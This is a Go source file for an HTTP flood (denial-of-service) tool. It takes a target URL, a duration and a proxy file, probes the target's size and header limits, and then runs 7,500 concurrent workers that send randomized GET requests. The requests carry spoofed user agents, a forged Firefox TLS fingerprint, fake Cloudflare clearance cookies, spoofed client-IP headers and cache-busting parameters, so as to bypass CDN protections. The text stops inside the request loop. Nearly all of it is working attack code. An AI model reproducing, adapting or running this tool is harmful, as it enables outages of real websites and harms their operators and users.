package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
	utls "github.com/refraction-networking/utls"
)

const (
	HAPUS  = "\033[0m"
	MERAH  = "\033[31m"
	IJO    = "\033[32m"
	PUTIH  = "\033[37m"
	CANDY  = "\033[91m"
	PUCAT  = "\033[38;5;203m"
	PUNYAMU = "\033[38;5;204m"
	PUNYA_LU_PUCAT = "\033[38;5;218m"
	MASA_DEPAN_NYA = "\033[97m"
)

const (
	WORKER_COUNT = 7500
	TIMEOUT      = 6 * time.Second
	KEEP_ALIVE   = 30 * time.Second
	POOL_SIZE    = 10000
)

type BPF struct {
	UA           string
	Accept       string
	Lang         string
	Encoding     string
	SecChUa      string
	SecChUaMov   string
	SecChUaPlat  string
	SecFetchSite string
	SecFetchMode string
	SecFetchDest string
	Referer      string
	Origin       string
	DNT          string
	StaticHeaders []headerItem
}

var PFS = []BPF{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
}

func init() {
	for i := range PFS {
		PFS[i].StaticHeaders = buildStaticHeaders(PFS[i])
	}
}

func buildStaticHeaders(p BPF) []headerItem {
	h := []headerItem{}
	if p.SecChUa != "" {
		h = append(h, headerItem{"Sec-Ch-Ua", p.SecChUa})
		h = append(h, headerItem{"Sec-Ch-Ua-Mobile", p.SecChUaMov})
		h = append(h, headerItem{"Sec-Ch-Ua-Platform", p.SecChUaPlat})
	}
	h = append(h, headerItem{"Accept", p.Accept})
	h = append(h, headerItem{"Accept-Language", p.Lang})
	h = append(h, headerItem{"Connection", "keep-alive"})
	h = append(h, headerItem{"Pragma", "no-cache"})
	h = append(h, headerItem{"Upgrade-Insecure-Requests", "1"})
	h = append(h, headerItem{"Sec-Fetch-Mode", p.SecFetchMode})
	h = append(h, headerItem{"Sec-Fetch-Dest", p.SecFetchDest})
	if p.DNT != "" {
		h = append(h, headerItem{"DNT", p.DNT})
	}
	return h
}

var (
	maxPayloadSize     int
	maxHeaderSize      int
	bypassSupport      map[string]bool
	httpVersion        string
	validOrigins       []string
	validUserAgents    []string
	validReferers      []string
	validMethods       []string
	validEncodings     []string
	validCacheControls []string
	skipVerify         bool
	maxBodyReadSize    int64 = 4096
)

var cacheParams = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var cookieNames = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var botUAs = []string{
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
}

var globalCookie string

var headerPool = sync.Pool{
	New: func() interface{} {
		return make([]headerItem, 0, 80)
	},
}

var headerMapPool = sync.Pool{
	New: func() interface{} {
		return make(http.Header)
	},
}

type headerItem struct{ key, value string }

var (
	randStringPool []string
	randIntPool    []int64
	randIndex      uint64
	randomIPs      []string
	ipIndex        uint64
)

func init() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	randStringPool = make([]string, POOL_SIZE)
	for i := 0; i < POOL_SIZE; i++ {
		randStringPool[i] = randStr(rng, 8)
	}
	randIntPool = make([]int64, POOL_SIZE)
	for i := 0; i < POOL_SIZE; i++ {
		randIntPool[i] = rng.Int63()
	}
	randomIPs = make([]string, 1024)
	for i := 0; i < 1024; i++ {
		randomIPs[i] = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}
}

func getRandString() string {
	idx := atomic.AddUint64(&randIndex, 1) % POOL_SIZE
	return randStringPool[idx]
}

func getRandInt() int64 {
	idx := atomic.AddUint64(&randIndex, 1) % POOL_SIZE
	return randIntPool[idx]
}

func getRandIP() string {
	idx := atomic.AddUint64(&ipIndex, 1) % uint64(len(randomIPs))
	return randomIPs[idx]
}

func randStr(rng *rand.Rand, n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := io.ReadFull(rand.New(rand.NewSource(time.Now().UnixNano())), b); err != nil {
		return getRandString()[:n]
	}
	return hex.EncodeToString(b)[:n]
}

func generateBypassCookie() string {
	ts := time.Now().Unix()
	return fmt.Sprintf("cf_clearance=%s_%d-1.2.1.1-%s", getRandString()+getRandString(), ts, getRandString()[:6])
}

func probeCertificate(host string) bool {
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: false,
	})
	if err == nil {
		conn.Close()
		return true
	}
	return false
}

func probeBodySize(target string) int64 {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return 4096
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil {
		return 4096
	}
	defer resp.Body.Close()
	if resp.ContentLength > 0 {
		if resp.ContentLength > 1024*1024 {
			return 1024 * 1024
		}
		return resp.ContentLength
	}
	return 4096
}

func BypassMaxPayload(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
	best := 0
	for _, sz := range sizes {
		u := target
		if strings.Contains(u, "?") {
			u += "&big=" + strings.Repeat("x", sz)
		} else {
			u += "?big=" + strings.Repeat("x", sz)
		}
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			best = sz
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return best
}

func BypassMaxHeader(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
	best := 0
	for _, sz := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", sz))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			best = sz
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return best
}

func BypassHeaderBypass(target, proxyIP string) map[string]bool {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	if proxyIP == "" {
		proxyIP = getRandIP()
	}
	headers := []string{
		"X-Original-URL",
		"X-Forwarded-Host",
		"X-Request-ID",
		"CDN-Loop",
		"CF-Connecting-IP",
		"True-Client-IP",
	}
	result := make(map[string]bool)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for _, h := range headers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		switch h {
		case "X-Original-URL":
			req.Header.Set("X-Original-URL", "/"+randStr(rng, 8))
		case "X-Forwarded-Host":
			req.Header.Set("X-Forwarded-Host", host)
		case "X-Request-ID":
			req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
		case "CDN-Loop":
			req.Header.Set("CDN-Loop", "cloudflare")
		case "CF-Connecting-IP":
			req.Header.Set("CF-Connecting-IP", proxyIP)
		case "True-Client-IP":
			req.Header.Set("True-Client-IP", proxyIP)
		}
		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func BypassHTTPVersion(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	proto := conn.ConnectionState().NegotiatedProtocol
	if proto == "h2" {
		return "H2"
	} else if proto == "http/1.1" {
		return "H1"
	}
	return "H3"
}

func BypassOrigins(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host,
		"https://www.google.com",
		"https://www.bing.com",
		"https://www.yahoo.com",
		"",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, o := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if o != "" {
			req.Header.Set("Origin", o)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, o)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host)
	}
	return valid
}

func BypassUserAgents(target string) []string {
	testUAs := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, testUAs[0])
	}
	return valid
}

func BypassReferers(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, r := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if r != "" {
			req.Header.Set("Referer", r)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, r)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host+"/")
	}
	return valid
}

func BypassMethods(target string) []string {
	return []string{"GET"}
}

func BypassEncodings(target string) []string {
	encs := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, e := range encs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", e)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, e)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "gzip, deflate, br")
	}
	return valid
}

func BypassCacheControls(target string) []string {
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, c := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", c)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, c)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "no-cache")
	}
	return valid
}

func loadCookieFromFile(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	fname := strings.ReplaceAll(host, ".", "_") + ".cookie"
	data, err := os.ReadFile(fname)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run main.go <target> <duration_seconds> <proxyfile>")
		fmt.Println("Example: go run main.go https://target.com 60 proxies.txt")
		os.Exit(1)
	}
	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	proxyFile := os.Args[3]

	var proxies []*url.URL
	file, err := os.Open(proxyFile)
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	globalCookie = loadCookieFromFile(target)
	if globalCookie != "" {
		fmt.Printf("[INFO] Loaded cookie from file\n")
	}

	parsedTarget, _ := url.Parse(target)
	host := parsedTarget.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}

	if probeCertificate(host) {
		skipVerify = false
		fmt.Println("[INFO] Certificate valid, using full verification")
	} else {
		skipVerify = true
		fmt.Println("[INFO] Certificate invalid/self-signed, skipping verification")
	}

	maxBodyReadSize = probeBodySize(target)
	if maxBodyReadSize == 0 {
		maxBodyReadSize = 4096
	}
	fmt.Printf("[INFO] Max body read size set to %d bytes\n", maxBodyReadSize)

	proxyIPs := []string{}
	for _, p := range proxies {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	if len(proxyIPs) == 0 {
		proxyIPs = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
	}
	firstProxyIP := ""
	if len(proxyIPs) > 0 {
		firstProxyIP = proxyIPs[0]
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	var wg sync.WaitGroup
	wg.Add(10)
	BypassDone := 0
	var BypassMu sync.Mutex
	printProbe := func(name string) {
		BypassMu.Lock()
		BypassDone++
		done := BypassDone
		BypassMu.Unlock()
		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
	}

	go func() { defer wg.Done(); maxPayloadSize = BypassMaxPayload(target); printProbe("Payload") }()
	go func() { defer wg.Done(); maxHeaderSize = BypassMaxHeader(target); printProbe("Header") }()
	go func() { defer wg.Done(); bypassSupport = BypassHeaderBypass(target, firstProxyIP); printProbe("All Bypass") }()
	go func() { defer wg.Done(); httpVersion = BypassHTTPVersion(target); printProbe("HTTP/2") }()
	go func() { defer wg.Done(); validOrigins = BypassOrigins(target); printProbe("Origin") }()
	go func() { defer wg.Done(); validUserAgents = BypassUserAgents(target); printProbe("UA") }()
	go func() { defer wg.Done(); validReferers = BypassReferers(target); printProbe("Referer") }()
	go func() { defer wg.Done(); validMethods = BypassMethods(target); printProbe("Method") }()
	go func() { defer wg.Done(); validEncodings = BypassEncodings(target); printProbe("Encoding") }()
	go func() { defer wg.Done(); validCacheControls = BypassCacheControls(target); printProbe("Cache") }()
	wg.Wait()
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	fmt.Printf("%s", MASA_DEPAN_NYA)
	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", PUNYA_LU_PUCAT)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", PUNYAMU)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", PUCAT)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", MERAH)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", CANDY)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", HAPUS)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS,
				MERAH, IJO, status, MERAH,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS)
		}
	}

	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "GET                        ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(proxies)), "True")
	printInfo("Worker", fmt.Sprintf("%d                       ", WORKER_COUNT), "True")
	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", httpVersion), "True")
	if globalCookie != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			MERAH, IJO, "True", MERAH)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			PUTIH, IJO, "None", PUTIH)
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	startTime := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(startTime).Seconds())
				if elapsed > duration && duration > 0 {
					elapsed = duration
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					IJO, HAPUS,
					PUTIH, HAPUS,
					MERAH, HAPUS,
					PUTIH, elapsed, duration, HAPUS,
					MERAH, IJO, "True", MERAH)
			}
		}
	}()
	var wg2 sync.WaitGroup
	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			cancel()
		})
	}

	type clientWrap struct {
		client *http.Client
		ip     string
	}
	clients := make([]clientWrap, len(proxies))
	for i, proxyURL := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   4 * time.Second,
				KeepAlive: KEEP_ALIVE,
			}).DialContext,
			DisableKeepAlives:     false,
			DisableCompression:    false,
			MaxIdleConns:          50000,
			MaxIdleConnsPerHost:   50000,
			MaxConnsPerHost:       0,
			IdleConnTimeout:       KEEP_ALIVE,
			TLSClientConfig:       nil,
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 4 * time.Second,
			ExpectContinueTimeout: 0 * time.Second,
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				dialer := &net.Dialer{Timeout: 4 * time.Second, KeepAlive: KEEP_ALIVE}
				conn, err := dialer.DialContext(ctx, network, addr)
				if err != nil {
					return nil, err
				}
				h, _, _ := net.SplitHostPort(addr)
				if h == "" {
					h = parsedTarget.Hostname()
				}
				config := &utls.Config{
					ServerName:         h,
					InsecureSkipVerify: skipVerify,
				}
				uconn := utls.UClient(conn, config, utls.HelloFirefox_Auto)
				if err := uconn.Handshake(); err != nil {
					conn.Close()
					return nil, err
				}
				return uconn, nil
			},
		}
		_ = http2.ConfigureTransport(tr)
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		clients[i] = clientWrap{
			client: &http.Client{Transport: tr, Timeout: TIMEOUT, Jar: jar},
			ip:     ip,
		}
	}

	var totalRequests, totalErrors int64
	precomputedPaths := make([]string, POOL_SIZE)
	for i := 0; i < POOL_SIZE; i++ {
		precomputedPaths[i] = "/" + getRandString() + "/"
	}
	precomputedReferers := make([]string, len(validReferers))
	copy(precomputedReferers, validReferers)

	for w := 0; w < WORKER_COUNT; w++ {
		wg2.Add(1)
		cw := clients[w%len(clients)]
		go func(cli clientWrap, workerID int) {
			defer wg2.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			for ctx.Err() == nil {
				profIdx := rng.Intn(len(PFS))
				prof := PFS[profIdx]

				method := "GET"

				ua := prof.UA
				if rng.Intn(10) < 3 && len(botUAs) > 0 {
					ua = botUAs[rng.Intn(len(botUAs))]
				}
				enc := validEncodings[rng.Intn(len(validEncodings))]
				cacheCtrl := validCacheControls[rng.Intn(len(validCacheControls))]

				forIP := proxyIPs[rng.Intn(len(proxyIPs))]
				realIP := cli.ip
				if realIP == "" {
					realIP = forIP
				}

				origin := validOrigins[rng.Intn(len(validOrigins))]
				referer := precomputedReferers[rng.Intn(len(precomputedReferers))]
				if origin != "" {
					for _, r := range validReferers {
						if strings.Contains(r, host) || strings.Contains(r, "google") || strings.Contains(r, "bing") {
							referer = r
							break
						}
					}
				}
				secFetchSite := "cross-site"
				if strings.Contains(origin, host) {
					secFetchSite = "same-origin"
				}

				params := []string{}
				params = append(params, "_="+strconv.FormatInt(time.Now().UnixNano(), 10))
				for j := 0; j < 1+rng.Intn(3); j++ {
					key := cacheParams[rng.Intn(len(cacheParams))]
					val := strconv.FormatInt(getRandInt(), 10)
					params = append(params, key+"="+val)
				}
				if maxPayloadSize > 0 && rng.Intn(3) == 0 {
					size := maxPayloadSize/2 + rng.Intn(maxPayloadSize/2)
					if size < 1 {
						size = 64
					}
					params = append(params, "big="+strings.Repeat("x", size))
				}
				if rng.Intn(10) == 0 {
					params = append(params, getRandString()+"="+getRandString())
				}

				finalURL := target
				if rng.Intn(5) == 0 {
					u, _ := url.Parse(finalURL)
					path := u.Path
					if !strings.HasSuffix(path, "/") {
						path += "/"
					}
					path += precomputedPaths[rng.Intn(POOL_SIZE)]
					u.Path = path
					finalURL = u.String()
				}
				if strings.Contains(finalURL, "?") {
					finalURL += "&" + strings.Join(params, "&")
				} else {
					finalURL += "?" + strings.Join(params, "&")
				}

				req, _ := http.NewRequest(method, finalURL, nil)

				headers := headerPool.Get().([]headerItem)
				headers = headers[:0]

				headers = append(headers, headerItem{"User-Agent", ua})
				headers = append(headers, headerItem{"Accept-Encoding", enc})
				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})

				if rng.Intn(2) == 0 {
					if rng.Intn(2) == 0 {
						headers = append(headers, headerItem{"Referer", "https://cloudflare.com/"})
					} else {
						headers = append(headers, headerItem{"Referer", "https://" + host + "/"})
					}
				} else if referer != "" {
					headers = append(headers, headerItem{"Referer", referer})
				}
				if origin != "" {
					headers = append(headers, headerItem{"Origin", origin})
				}
				headers = append(headers, headerItem{"Sec-Fetch-Site", secFetchSite})

				headers = append(headers, prof.StaticHeaders...)

				headers = append(headers, headerItem{"If-Modified-Since", time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)})
				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(getRandInt(), 16)})

				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"TE", "trailers"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"A-IM", "Feed"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Delta-Base", "12340001"})
				}
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"dnt", "1"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"source-ip", getRandString()})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Data-Return", "false"})
				}

				if bypassSupport["X-Original-URL"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Original-URL", "/" + getRandString()})
				}
				if bypassSupport["X-Forwarded-Host"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Forwarded-Host", getRandString() + "t.me/ytdizflyze"})
				}
				if bypassSupport["X-Request-ID"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(getRandInt(), 16)})
				}
				if bypassSupport["CF-Connecting-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
				}
				if bypassSupport["True-Client-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"True-Client-IP", realIP})
				}
				if bypassSupport["CDN-Loop"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CDN-Loop", "cloudflare"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"X-Real-IP", realIP})
				}
				if maxHeaderSize > 0 && rng.Intn(2) == 0 {
					size := maxHeaderSize/2 + rng.Intn(maxHeaderSize/2)
					if size < 1 {
						size = 512
					}
					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
				}

				var cookies []string
				if globalCookie != "" {
					cookies = append(cookies, globalCookie)
				}
				cookies = append(cookies, generateBypassCookie())
				for _, name := range cookieNames {
					if rng.Intn(2) == 0 {
						cookies = append(cookies, name+"="+strconv.FormatInt(getRandInt(), 16))
					}
				}
				if len(cookies) > 0 {
					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
				}

				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
				headers = append(headers, headerItem{"X-Real-IP", realIP})
				headers = append(headers, headerItem{"Range", "bytes=0-"})
				headers = append(headers, headerItem{"If-None-Match", `"` + getRandString() + `"`})
				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + getRandIP()})
				headers = append(headers, headerItem{"X-Originating-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
				headers = append(headers, headerItem{"X-Client-IP", realIP})

				rng.Shuffle(len(headers), func(i, j int) {
					headers[i], headers[j] = headers[j], headers[i]
				})

				headerMap := headerMapPool.Get().(http.Header)
				for k := range headerMap {
					delete(headerMap, k)
				}
				for _, h := range headers {
					headerMap.Add(h.key, h.value)
				}
				req.Header = headerMap

				resp, err := cli.client.Do(req)
				if err == nil {
					io.Copy(io.Discard, io.LimitReader(resp.Body, maxBodyReadSize))
					resp.Body.Close()
